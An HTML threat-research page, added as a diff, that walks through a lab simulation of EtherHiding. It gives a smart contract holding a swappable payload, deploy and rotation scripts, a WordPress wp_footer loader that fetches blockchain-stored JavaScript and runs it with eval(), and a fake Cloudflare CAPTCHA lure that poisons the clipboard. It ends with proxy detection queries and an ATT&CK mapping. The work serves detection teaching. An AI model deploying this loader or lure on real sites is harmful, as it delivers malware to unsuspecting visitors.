@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>EtherHiding: Blockchain-based Payload Delivery via Smart Contracts</title>
+        <link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="../css/styles.css" rel="stylesheet" />
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-xl navbar-dark bg-primary fixed-top" id="sideNav">
+            <script src="/js/nav.js"></script>
+        </nav>
+        <!-- Page Content-->
+        <div>
+            <nav class="navbar navbar-expand-xl navbar-dark bg-header sticky-top">
+                <h3 class="header-article"><a href="../vulnpage.html">Threat Research</a> > EtherHiding Simulation</h3>
+            </nav>
+            <section class="article">
+                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
+                    <div class="flex-grow-1">
+
+                        <!-- ─────────────────────────────────────────────
+                             1. INTRODUCTION
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">What is EtherHiding ?</h4>
+                        <p>
+                            EtherHiding is a technique first documented by Guardio Labs in 2023 where attackers store malicious JavaScript payloads inside a blockchain smart contract instead of on a traditional attacker-controlled server. A compromised WordPress site injects a small loader into every page via the <code>wp_footer</code> hook. When a victim visits the page, their browser silently fetches the current payload from the blockchain via a JSON-RPC <code>eth_call</code>, then executes it with <code>eval()</code>.
+                            <br><br>
+                            The key advantage for the attacker is resilience. A traditional C2 domain can be taken down or blocklisted within hours. A smart contract deployed on the Binance Smart Chain (BSC) cannot be removed by any third party, including Binance itself. The attacker only needs to call <code>setPayload()</code> to rotate their C2 domain or update their lure template — all compromised WordPress sites update simultaneously without the attacker ever touching them again.
+                            <br><br>
+                            The full attack chain from the victim's perspective looks like this:
+                            <br><br>
+                            &emsp;1. Victim visits a legitimate but compromised WordPress site<br>
+                            &emsp;2. Browser loads the page — <code>wp_footer</code> fires the injected loader<br>
+                            &emsp;3. Loader makes a POST request to a BSC RPC endpoint via <code>eth_call</code><br>
+                            &emsp;4. Smart contract returns the current malicious payload (ABI-encoded string)<br>
+                            &emsp;5. Loader decodes the ABI response and calls <code>eval(payload)</code><br>
+                            &emsp;6. Browser renders a fake Cloudflare Turnstile CAPTCHA (ClickFix lure)<br>
+                            &emsp;7. Victim clicks the checkbox — clipboard is poisoned with a malicious PowerShell command<br>
+                            &emsp;8. Victim follows Win+R instructions — malware executes on the host<br>
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             2. SMART CONTRACT
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">The Smart Contract</h4>
+                        <p>
+                            The smart contract is the core of the technique. It stores the malicious payload as a state variable on the blockchain. Unlike a hardcoded return value in bytecode, a state variable can be updated by calling <code>setPayload()</code> without redeploying the contract — the contract address never changes, only the stored value does.
+                            <br><br>
+                            The contract is written in Solidity and compiled using Remix IDE at <a href="https://remix.ethereum.org">remix.ethereum.org</a>. For the simulation we deploy to the Sepolia testnet rather than BSC Mainnet — functionally identical but using worthless test ETH.
+
+                            <div class="squarebox">
+                                // SPDX-License-Identifier: MIT <br>
+                                pragma solidity ^0.8.20; <br>
+                                <br>
+                                contract UpdateableHello { <br>
+                                &emsp;string public payload; <br>
+                                &emsp;address public owner; <br>
+                                <br>
+                                &emsp;constructor() { <br>
+                                &emsp;&emsp;owner = msg.sender; <br>
+                                &emsp;&emsp;payload = "Hello World v1"; <br>
+                                &emsp;} <br>
+                                <br>
+                                &emsp;function setPayload(string memory _payload) public { <br>
+                                &emsp;&emsp;require(msg.sender == owner, "Not authorized"); <br>
+                                &emsp;&emsp;payload = _payload; <br>
+                                &emsp;} <br>
+                                <br>
+                                &emsp;function getPayload() public view returns (string memory) { <br>
+                                &emsp;&emsp;return payload; <br>
+                                &emsp;} <br>
+                                } <br>
+                            </div>
+
+                            The <code>require(msg.sender == owner)</code> check ensures only the deployer wallet can call <code>setPayload()</code>. Anyone can call <code>getPayload()</code> — which is exactly what the WordPress loader does from the victim's browser.
+                            <br><br>
+                            Key distinction between the two functions:
+                            <br><br>
+                            &emsp;<code>getPayload()</code> is a <code>view</code> function — it reads state, costs no gas, and is called via <code>eth_call</code>. No signing required. Any anonymous HTTP client can call it.<br>
+                            &emsp;<code>setPayload()</code> is a state-changing function — it writes to the blockchain. It requires a signed transaction (<code>eth_sendRawTransaction</code>), costs gas, and requires the deployer's private key.<br>
+                            <br>
+                            Once compiled in Remix, copy the ABI from the Solidity Compiler tab and the bytecode from Compilation Details &rarr; BYTECODE &rarr; object field.
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             3. DEPLOYMENT
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">Deploying the Contract (deploy.js)</h4>
+                        <p>
+                            The contract is deployed using Node.js and the ethers.js library. Remix's built-in deployment requires a browser wallet extension (MetaMask), which may not always be available. Using a Node.js script with a raw private key bypasses this dependency entirely.
+                            <br><br>
+                            First, generate a test wallet and fund it with free Sepolia ETH from <a href="https://cloud.google.com/application/web3/faucet/ethereum/sepolia">Google Cloud Faucet</a>:
+
+                            <div class="squarebox">
+                                node -e "const {ethers}=require('ethers'); const w=ethers.Wallet.createRandom(); console.log('Address:',w.address,'\nKey:',w.privateKey)"
+                            </div>
+
+                            Then create <code>deploy.js</code>:
+
+                            <div class="squarebox">
+                                const { ethers } = require("ethers"); <br>
+                                <br>
+                                const ALCHEMY_KEY = "YOUR_ALCHEMY_API_KEY"; <br>
+                                const PRIVATE_KEY = "0xYourPrivateKey"; <br>
+                                const BYTECODE    = "0x608060..."; // from Remix Compilation Details <br>
+                                <br>
+                                const ABI = [ <br>
+                                &emsp;{ "inputs": [], "stateMutability": "nonpayable", "type": "constructor" }, <br>
+                                &emsp;{ "inputs": [], "name": "getPayload", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, <br>
+                                &emsp;{ "inputs": [{ "internalType": "string", "name": "_payload", "type": "string" }], "name": "setPayload", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, <br>
+                                &emsp;{ "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" } <br>
+                                ]; <br>
+                                <br>
+                                async function main() { <br>
+                                &emsp;const provider = new ethers.JsonRpcProvider( <br>
+                                &emsp;&emsp;`https://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_KEY}` <br>
+                                &emsp;); <br>
+                                &emsp;const wallet  = new ethers.Wallet(PRIVATE_KEY, provider); <br>
+                                &emsp;console.log("Deploying from:", wallet.address); <br>
+                                <br>
+                                &emsp;const balance = await provider.getBalance(wallet.address); <br>
+                                &emsp;console.log("Balance:", ethers.formatEther(balance), "ETH"); <br>
+                                <br>
+                                &emsp;const factory  = new ethers.ContractFactory(ABI, BYTECODE, wallet); <br>
+                                &emsp;const contract = await factory.deploy(); <br>
+                                &emsp;console.log("Deploying... tx:", contract.deploymentTransaction().hash); <br>
+                                &emsp;await contract.waitForDeployment(); <br>
+                                <br>
+                                &emsp;const address = await contract.getAddress(); <br>
+                                &emsp;console.log("Deployed at:", address); <br>
+                                <br>
+                                &emsp;const result = await contract.getPayload(); <br>
+                                &emsp;console.log("getPayload():", result); <br>
+                                } <br>
+                                <br>
+                                main().catch(console.error); <br>
+                            </div>
+
+                            Run with:
+
+                            <div class="squarebox">
+                                npm init -y <br>
+                                npm install ethers <br>
+                                node deploy.js <br>
+                            </div>
+
+                            The output will show the deployed contract address. This address is permanent on Sepolia — save it for all subsequent steps.
+                            <br><br>
+                            Note: <code>deploy.js</code> calls <code>eth_sendRawTransaction</code> under the hood — a real signed transaction that costs Sepolia ETH (worthless test currency). The private key signs the transaction locally; only the signed bytes are broadcast to the network. The key itself never leaves your machine.
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             4. PAYLOAD ROTATION
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">Rotating the Payload (update.js)</h4>
+                        <p>
+                            Once deployed, the contract address never changes. The attacker updates the payload by calling <code>setPayload()</code> — this is a state-changing transaction that permanently updates the stored string on-chain. Every compromised WordPress loader automatically serves the new payload on the next page visit.
+                            <br><br>
+                            <code>update.js</code> reads the payload from a file to avoid one-liner limitations on complex HTML/JS content:
+
+                            <div class="squarebox">
+                                const { ethers } = require("ethers"); <br>
+                                const fs          = require("fs"); <br>
+                                <br>
+                                const ALCHEMY_KEY = "YOUR_ALCHEMY_API_KEY"; <br>
+                                const PRIVATE_KEY = "0xYourPrivateKey"; <br>
+                                <br>
+                                const ABI = [ <br>
+                                &emsp;"function setPayload(string memory _payload) public", <br>
+                                &emsp;"function getPayload() public view returns (string memory)" <br>
+                                ]; <br>
+                                <br>
+                                async function updatePayload(contractAddress, newPayload) { <br>
+                                &emsp;const provider = new ethers.JsonRpcProvider( <br>
+                                &emsp;&emsp;`https://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_KEY}` <br>
+                                &emsp;); <br>
+                                &emsp;const wallet   = new ethers.Wallet(PRIVATE_KEY, provider); <br>
+                                &emsp;const contract = new ethers.Contract(contractAddress, ABI, wallet); <br>
+                                <br>
+                                &emsp;const before = await contract.getPayload(); <br>
+                                &emsp;console.log("Current payload:", before); <br>
+                                <br>
+                                &emsp;const tx = await contract.setPayload(newPayload); <br>
+                                &emsp;console.log("Transaction sent:", tx.hash); <br>
+                                &emsp;await tx.wait(); <br>
+                                &emsp;console.log("Updated"); <br>
+                                <br>
+                                &emsp;const after = await contract.getPayload(); <br>
+                                &emsp;console.log("New payload:", after); <br>
+                                } <br>
+                                <br>
+                                const contractAddress = process.argv[2]; <br>
+                                let newPayload; <br>
+                                <br>
+                                if (process.argv[3] && process.argv[3].startsWith("file:")) { <br>
+                                &emsp;const filePath = process.argv[3].replace("file:", ""); <br>
+                                &emsp;newPayload = fs.readFileSync(filePath, "utf8").trim(); <br>
+                                } else { <br>
+                                &emsp;newPayload = process.argv[3]; <br>
+                                } <br>
+                                <br>
+                                if (!contractAddress || !newPayload) { <br>
+                                &emsp;console.error("Usage: node update.js &lt;address&gt; &lt;payload&gt;"); <br>
+                                &emsp;console.error("       node update.js &lt;address&gt; file:payload.js"); <br>
+                                &emsp;process.exit(1); <br>
+                                } <br>
+                                <br>
+                                updatePayload(contractAddress, newPayload).catch(console.error); <br>
+                            </div>
+
+                            To simulate C2 domain rotation, update the payload between visits:
+
+                            <div class="squarebox">
+                                node update.js 0xYourContract file:payload_v1.js &nbsp;# ClickFix lure v1 <br>
+                                node update.js 0xYourContract file:payload_v2.js &nbsp;# Rotate to new lure <br>
+                                node update.js 0xYourContract file:payload_v3.js &nbsp;# Rotate again <br>
+                            </div>
+
+                            Each update is visible on Sepolia Etherscan as a separate <code>setPayload()</code> transaction. The input data field of each transaction, viewed as UTF-8, shows the payload in plaintext — exactly what analysts see when investigating EtherHiding on BSCScan.
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             5. WORDPRESS INJECTION
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">WordPress wp_footer Injection</h4>
+                        <p>
+                            The <code>wp_footer</code> hook is an action hook in WordPress's core rendering lifecycle. It fires on every page, on every request, right before the closing <code>&lt;/body&gt;</code> tag. Any callback registered to it renders its output into every page of the site automatically — which is why attackers target it. One injection point reaches every visitor.
+                            <br><br>
+                            In a real compromise, the attacker gains write access to <code>functions.php</code> via one of several paths: stolen wp-admin credentials and the Theme File Editor, a vulnerable plugin CVE granting remote code execution, FTP/SFTP credential compromise, or SQL injection directly into the <code>wp_options</code> database table. For this simulation we use a Docker-hosted WordPress instance and edit <code>functions.php</code> directly.
+                            <br><br>
+                            First, identify the active theme:
+
+                            <div class="squarebox">
+                                docker exec -it &lt;container_name&gt; wp theme list --allow-root --status=active
+                            </div>
+
+                            Then add the following to the active theme's <code>functions.php</code> via Appearance &rarr; Theme File Editor &rarr; functions.php in wp-admin:
+
+                            <div class="squarebox">
+                                add_action('wp_footer', 'etherhiding_loader'); <br>
+                                <br>
+                                function etherhiding_loader() { <br>
+                                ?> <br>
+                                &lt;div id="status" style="position:fixed;bottom:10px;right:10px;background:#333;color:#fff;padding:10px;font-size:12px;z-index:9999;display:block;"&gt;&lt;/div&gt; <br>
+                                &lt;script&gt; <br>
+                                (function() { <br>
+                                &emsp;var CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; <br>
+                                &emsp;var RPC_URL          = "https://eth-sepolia.g.alchemy.com/v2/YOUR_API_KEY"; <br>
+                                &emsp;var SELECTOR         = "0x????????"; // keccak256("getPayload()") first 4 bytes <br>
+                                <br>
+                                &emsp;var status = document.getElementById("status"); <br>
+                                &emsp;status.textContent = "Fetching from blockchain..."; <br>
+                                <br>
+                                &emsp;function decodeABIString(hexResult) { <br>
+                                &emsp;&emsp;var hex    = hexResult.slice(2); <br>
+                                &emsp;&emsp;var length = parseInt(hex.slice(64, 128), 16); <br>
+                                &emsp;&emsp;var strHex = hex.slice(128, 128 + length * 2); <br>
+                                &emsp;&emsp;var bytes  = strHex.match(/.{2}/g).map(function(b) { <br>
+                                &emsp;&emsp;&emsp;return parseInt(b, 16); <br>
+                                &emsp;&emsp;}); <br>
+                                &emsp;&emsp;return String.fromCharCode.apply(null, bytes); <br>
+                                &emsp;} <br>
+                                <br>
+                                &emsp;fetch(RPC_URL, { <br>
+                                &emsp;&emsp;method:  "POST", <br>
+                                &emsp;&emsp;headers: { "Content-Type": "application/json" }, <br>
+                                &emsp;&emsp;body: JSON.stringify({ <br>
+                                &emsp;&emsp;&emsp;jsonrpc: "2.0", <br>
+                                &emsp;&emsp;&emsp;method:  "eth_call", <br>
+                                &emsp;&emsp;&emsp;params:  [{ to: CONTRACT_ADDRESS, data: SELECTOR }, "latest"], <br>
+                                &emsp;&emsp;&emsp;id: 1 <br>
+                                &emsp;&emsp;}) <br>
+                                &emsp;}) <br>
+                                &emsp;.then(function(r) { return r.json(); }) <br>
+                                &emsp;.then(function(data) { <br>
+                                &emsp;&emsp;var payload = decodeABIString(data.result); <br>
+                                &emsp;&emsp;status.textContent = "Payload received: " + payload; <br>
+                                &emsp;&emsp;console.log("[SIMULATION] Payload:", payload); <br>
+                                &emsp;&emsp;setTimeout(function() { <br>
+                                &emsp;&emsp;&emsp;eval(payload); <br>
+                                &emsp;&emsp;}, 2000); <br>
+                                &emsp;}) <br>
+                                &emsp;.catch(function(err) { <br>
+                                &emsp;&emsp;status.textContent = "Error: " + err.message; <br>
+                                &emsp;&emsp;console.error("[SIMULATION] Fetch failed:", err); <br>
+                                &emsp;}); <br>
+                                })(); <br>
+                                &lt;/script&gt; <br>
+                                &lt;?php <br>
+                                } <br>
+                            </div>
+
+                            To get the <code>getPayload()</code> function selector, run:
+
+                            <div class="squarebox">
+                                node -e "const {ethers}=require('ethers'); console.log(ethers.id('getPayload()').slice(0,10))"
+                            </div>
+
+                            The function selector is the first 4 bytes of the keccak256 hash of the function signature string. It is deterministic — the same selector will be produced on any machine, for any contract, on any network, forever. This is how the EVM's function dispatcher identifies which function to execute when a contract call arrives.
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             6. THE CLICKFIX PAYLOAD
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">The ClickFix Lure Payload</h4>
+                        <p>
+                            The payload stored in the smart contract is a JavaScript string that gets passed directly to <code>eval()</code>. It uses <code>document.body.innerHTML</code> to replace the entire page with a fake Cloudflare Turnstile CAPTCHA — the ClickFix lure.
+                            <br><br>
+                            Note: script tags injected via <code>innerHTML</code> do not execute — this is a browser security feature. The payload must be pure JavaScript executed via <code>eval()</code>, not HTML containing <code>&lt;script&gt;</code> tags.
+                            <br><br>
+                            Create <code>payload.js</code>:
+
+                            <div class="squarebox">
+                                document.body.innerHTML = ` <br>
+                                &emsp;&lt;style&gt; <br>
+                                &emsp;*{box-sizing:border-box;margin:0;padding:0} <br>
+                                &emsp;body{font-family:Arial,sans-serif;background:#f6f6ef;min-height:100vh; <br>
+                                &emsp;&emsp;display:flex;flex-direction:column} <br>
+                                &emsp;.cf-nav{background:#fff;border-bottom:1px solid #e5e7eb;padding:12px 24px; <br>
+                                &emsp;&emsp;display:flex;align-items:center} <br>
+                                &emsp;.cf-nav span{font-size:15px;font-weight:600;color:#1d1d1b} <br>
+                                &emsp;.content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px} <br>
+                                &emsp;.box{background:#fff;border:1px solid #e5e7eb;border-radius:8px; <br>
+                                &emsp;&emsp;padding:36px 40px;max-width:420px;width:100%;text-align:center} <br>
+                                &emsp;.box h1{font-size:20px;font-weight:600;color:#1d1d1b;margin-bottom:8px} <br>
+                                &emsp;.box p{font-size:14px;color:#6b7280;margin-bottom:24px;line-height:1.6} <br>
+                                &emsp;.turnstile{border:1px solid #e5e7eb;border-radius:4px;padding:14px 16px; <br>
+                                &emsp;&emsp;display:flex;align-items:center;gap:12px;margin-bottom:20px; <br>
+                                &emsp;&emsp;background:#fafafa;cursor:pointer} <br>
+                                &emsp;.checkbox{width:24px;height:24px;border:2px solid #d1d5db; <br>
+                                &emsp;&emsp;border-radius:4px;background:#fff;flex-shrink:0} <br>
+                                &emsp;.verify-btn{width:100%;padding:12px;background:#f97316;color:#fff; <br>
+                                &emsp;&emsp;border:none;border-radius:4px;font-size:15px;font-weight:600; <br>
+                                &emsp;&emsp;cursor:pointer;margin-bottom:16px;display:none} <br>
+                                &emsp;.instructions{background:#fff8f1;border:1px solid #fed7aa; <br>
+                                &emsp;&emsp;border-radius:4px;padding:16px;text-align:left;display:none} <br>
+                                &emsp;.instructions p{font-size:13px;color:#92400e;font-weight:600;margin-bottom:10px} <br>
+                                &emsp;.step{display:flex;align-items:center;gap:10px;margin-bottom:8px;font-size:13px;color:#1d1d1b} <br>
+                                &emsp;.step-num{width:22px;height:22px;border-radius:50%;background:#f97316;color:#fff; <br>
+                                &emsp;&emsp;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center} <br>
+                                &emsp;kbd{background:#f3f4f6;border:1px solid #d1d5db;border-radius:3px; <br>
+                                &emsp;&emsp;padding:1px 6px;font-size:12px;font-family:monospace} <br>
+                                &emsp;&lt;/style&gt; <br>
+                                &emsp;&lt;div class="cf-nav"&gt;&lt;span&gt;Cloudflare&lt;/span&gt;&lt;/div&gt; <br>
+                                &emsp;&lt;div class="content"&gt;&lt;div class="box"&gt; <br>
+                                &emsp;&lt;h1&gt;Verify you are human&lt;/h1&gt; <br>
+                                &emsp;&lt;p&gt;This site is protected by Cloudflare. Complete the security challenge to continue.&lt;/p&gt; <br>
+                                &emsp;&lt;div class="turnstile" onclick="verifyHuman()"&gt; <br>
+                                &emsp;&lt;div class="checkbox" id="cf-cb"&gt;&lt;/div&gt; <br>
+                                &emsp;&lt;div style="flex:1;text-align:left;font-size:14px;color:#1d1d1b"&gt;I am human&lt;/div&gt; <br>
+                                &emsp;&lt;span style="font-size:11px;color:#9ca3af"&gt;Cloudflare&lt;/span&gt; <br>
+                                &emsp;&lt;/div&gt; <br>
+                                &emsp;&lt;button class="verify-btn" id="cf-btn" onclick="showSteps()"&gt;Verify&lt;/button&gt; <br>
+                                &emsp;&lt;div class="instructions" id="cf-steps"&gt; <br>
+                                &emsp;&lt;p&gt;Verification step 2 — Complete the security check:&lt;/p&gt; <br>
+                                &emsp;&lt;div class="step"&gt;&lt;div class="step-num"&gt;1&lt;/div&gt;&lt;span&gt;Press Win + R&lt;/span&gt;&lt;/div&gt; <br>
+                                &emsp;&lt;div class="step"&gt;&lt;div class="step-num"&gt;2&lt;/div&gt;&lt;span&gt;Press Ctrl + V&lt;/span&gt;&lt;/div&gt; <br>
+                                &emsp;&lt;div class="step"&gt;&lt;div class="step-num"&gt;3&lt;/div&gt;&lt;span&gt;Press Enter&lt;/span&gt;&lt;/div&gt; <br>
+                                &emsp;&lt;/div&gt; <br>
+                                &emsp;&lt;/div&gt;&lt;/div&gt; <br>
+                                `; <br>
+                                <br>
+                                // Attach event handlers after innerHTML is set <br>
+                                window.verifyHuman = function() { <br>
+                                &emsp;var cb = document.getElementById('cf-cb'); <br>
+                                &emsp;cb.style.background = '#00b264'; <br>
+                                &emsp;cb.style.borderColor = '#00b264'; <br>
+                                &emsp;navigator.clipboard.writeText('SIMULATION_PAYLOAD_NOT_MALICIOUS'); <br>
+                                &emsp;setTimeout(function() { <br>
+                                &emsp;&emsp;document.getElementById('cf-btn').style.display = 'block'; <br>
+                                &emsp;}, 600); <br>
+                                }; <br>
+                                <br>
+                                window.showSteps = function() { <br>
+                                &emsp;document.getElementById('cf-btn').style.display = 'none'; <br>
+                                &emsp;document.getElementById('cf-steps').style.display = 'block'; <br>
+                                }; <br>
+                            </div>
+
+                            Deploy the payload to the contract:
+
+                            <div class="squarebox">
+                                node update.js 0xYourContractAddress file:payload.js
+                            </div>
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             7. ABI DECODING
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">ABI Decoding the Response</h4>
+                        <p>
+                            The raw response from <code>eth_call</code> is an ABI-encoded hex string. Ethereum's ABI encoding for a string type always follows a three-chunk structure of 32 bytes (64 hex characters) each:
+                            <br><br>
+                            &emsp;Chunk 1 (bytes 0-63): offset pointer — always <code>0x20</code> (32) for a single string return, indicating where the string data starts<br>
+                            &emsp;Chunk 2 (bytes 64-127): string length in bytes, as a hex integer<br>
+                            &emsp;Chunk 3 (bytes 128+): the actual UTF-8 bytes of the string, zero-padded to the next 32-byte boundary<br>
+
+                            <div class="squarebox">
+                                0x <br>
+                                0000000000000000000000000000000000000000000000000000000000000020 &nbsp;// chunk 1: offset = 32 <br>
+                                000000000000000000000000000000000000000000000000000000000000000e &nbsp;// chunk 2: length = 14 <br>
+                                48656c6c6f20576f726c642076310000000000000000000000000000000000 &nbsp;// chunk 3: "Hello World v1" <br>
+                            </div>
+
+                            The JavaScript decoder in the loader:
+
+                            <div class="squarebox">
+                                function decodeABIString(hexResult) { <br>
+                                &emsp;var hex    = hexResult.slice(2); &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;// remove 0x prefix <br>
+                                &emsp;var length = parseInt(hex.slice(64, 128), 16); &emsp;// chunk 2: string length <br>
+                                &emsp;var strHex = hex.slice(128, 128 + length * 2); &nbsp;// chunk 3: string bytes <br>
+                                &emsp;var bytes  = strHex.match(/.{2}/g).map(function(b) { <br>
+                                &emsp;&emsp;return parseInt(b, 16); &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;// hex pair to byte value <br>
+                                &emsp;}); <br>
+                                &emsp;return String.fromCharCode.apply(null, bytes); &nbsp;// bytes to string <br>
+                                } <br>
+                            </div>
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             8. PROXY LOG ANALYSIS
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">Proxy Log Analysis</h4>
+                        <p>
+                            When a victim visits the compromised WordPress page, three distinct log entries appear in the proxy — chained by the same source IP and Referer header:
+                            <br><br>
+                            &emsp;Request 1 — GET to the WordPress page (normal page load)<br>
+                            &emsp;Request 2 — POST to the Alchemy/RPC endpoint (<code>eth_call</code> fetching the payload)<br>
+                            &emsp;Request 3 — GET to google.com (eval() executes the redirect payload)<br>
+                            <br>
+                            Request 2 is the detection signal. With SSL inspection enabled on Zscaler or a similar proxy, the POST body is visible and contains the full JSON-RPC payload:
+
+                            <div class="squarebox">
+                                POST https://eth-sepolia.g.alchemy.com/v2/YOUR_API_KEY <br>
+                                Content-Type: application/json <br>
+                                Referer: http://your-wordpress-site/ <br>
+                                <br>
+                                { <br>
+                                &emsp;"jsonrpc": "2.0", <br>
+                                &emsp;"method": "eth_call", <br>
+                                &emsp;"params": [{ <br>
+                                &emsp;&emsp;"to": "0xYourContractAddress", <br>
+                                &emsp;&emsp;"data": "0x????????" <br>
+                                &emsp;}, "latest"], <br>
+                                &emsp;"id": 1 <br>
+                                } <br>
+                            </div>
+
+                            A browser making a POST request to a blockchain RPC endpoint from a WordPress page is highly anomalous in a corporate environment. No legitimate WordPress site has any reason to call Ethereum JSON-RPC endpoints.
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             9. DETECTION
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">Detection</h4>
+                        <p>
+                            The following detection strategies are ordered from highest to lowest confidence.
+                            <br><br>
+                            <b>Network layer — POST to blockchain RPC endpoint from browser</b><br>
+                            The most reliable signal: a browser process making a POST request to a known blockchain RPC provider domain. Legitimate users do not browse to WordPress sites that call Ethereum nodes.
+
+                            <div class="squarebox">
+                                index=proxy <br>
+                                | where dest_domain IN ( <br>
+                                &emsp;"eth-sepolia.g.alchemy.com", <br>
+                                &emsp;"eth-mainnet.g.alchemy.com", <br>
+                                &emsp;"bsc-dataseed.binance.org", <br>
+                                &emsp;"bsc-dataseed1.binance.org", <br>
+                                &emsp;"mainnet.infura.io", <br>
+                                &emsp;"rpc.ankr.com" <br>
+                                ) <br>
+                                | where request_method="POST" <br>
+                                | where cs_referer LIKE "%wp-content%" OR cs_referer LIKE "%wordpress%" <br>
+                                | table _time, src_ip, src_user, dest_domain, cs_referer, request_body <br>
+                            </div>
+
+                            <b>Payload layer — eth_call method in POST body (requires SSL inspection)</b>
+
+                            <div class="squarebox">
+                                index=proxy <br>
+                                | where request_method="POST" <br>
+                                | where match(request_body, "\"method\":\"eth_call\"") <br>
+                                | where NOT src_process IN ("known_dev_tools") <br>
+                                | table _time, src_ip, src_user, dest_domain, request_body <br>
+                            </div>
+
+                            <b>CrowdStrike — browser process making outbound connection to RPC domain</b>
+
+                            <div class="squarebox">
+                                event_simpleName=DnsRequest <br>
+                                | where DomainName IN ( <br>
+                                &emsp;"bsc-dataseed.binance.org", <br>
+                                &emsp;"eth-mainnet.g.alchemy.com", <br>
+                                &emsp;"mainnet.infura.io" <br>
+                                ) <br>
+                                | where ImageFileName NOT IN ( <br>
+                                &emsp;"node.exe","chrome.exe","firefox.exe","brave.exe" <br>
+                                ) <br>
+                                | table timestamp, ComputerName, UserName, ImageFileName, DomainName <br>
+                            </div>
+
+                            <b>WordPress file integrity — functions.php modification</b>
+
+                            <div class="squarebox">
+                                event_simpleName=FileCreate <br>
+                                | where TargetFileName LIKE "%functions.php%" <br>
+                                | where TargetFileName LIKE "%wp-content%themes%" <br>
+                                | where ImageFileName NOT IN (known_deploy_tools) <br>
+                                | table timestamp, ComputerName, ImageFileName, TargetFileName <br>
+                            </div>
+
+                            <b>Database content — wp_options injection (no file system footprint)</b>
+
+                            <div class="squarebox">
+                                SELECT option_name, option_value <br>
+                                FROM wp_options <br>
+                                WHERE option_value REGEXP 'eval\(|atob\(|eth_call|fromCharCode|&lt;script' <br>
+                                AND option_name IN ('widget_text','widget_custom_html') <br>
+                                OR option_name LIKE 'theme_mods_%'; <br>
+                            </div>
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             10. MITRE ATT&CK
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">MITRE ATT&amp;CK Mapping</h4>
+                        <p>
+                            &emsp;T1102.001 — Web Service: Dead Drop Resolver (blockchain as resolver)<br>
+                            &emsp;T1059.007 — Command and Scripting Interpreter: JavaScript (eval() execution)<br>
+                            &emsp;T1505.003 — Server Software Component: Web Shell (wp_footer injection)<br>
+                            &emsp;T1566.002 — Phishing: Spearphishing Link (ClickFix lure delivery)<br>
+                            &emsp;T1204.001 — User Execution: Malicious Link (victim pastes clipboard command)<br>
+                            &emsp;T1059.001 — Command and Scripting Interpreter: PowerShell (clipboard payload execution)<br>
+                        </p>
+
+                        <!-- ─────────────────────────────────────────────
+                             11. REFERENCES
+                        ───────────────────────────────────────────── -->
+                        <h4 class="mb-0">References</h4>
+                        <p>
+                            &emsp;<a href="https://labs.guard.io/etherhiding-inside-the-world-of-web3-malware-hiding-in-plain-sight-on-the-blockchain-c01bfa7e38b7">Guardio Labs — EtherHiding: Blockchain-based C2 (2023)</a><br>
+                            &emsp;<a href="https://www.proofpoint.com/us/blog/threat-insight/clipboard-hijacking">Proofpoint — ClickFix: Clipboard Hijacking via Fake CAPTCHA</a><br>
+                            &emsp;<a href="https://attack.mitre.org/techniques/T1102/001/">MITRE ATT&amp;CK T1102.001 — Dead Drop Resolver</a><br>
+                            &emsp;<a href="https://sepolia.etherscan.io">Sepolia Etherscan — testnet explorer</a><br>
+                            &emsp;<a href="https://remix.ethereum.org">Remix IDE — Solidity browser compiler</a><br>
+                        </p>
+
+                    </div>
+                </div>
+            </section>
+        </div>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Third party plugin JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
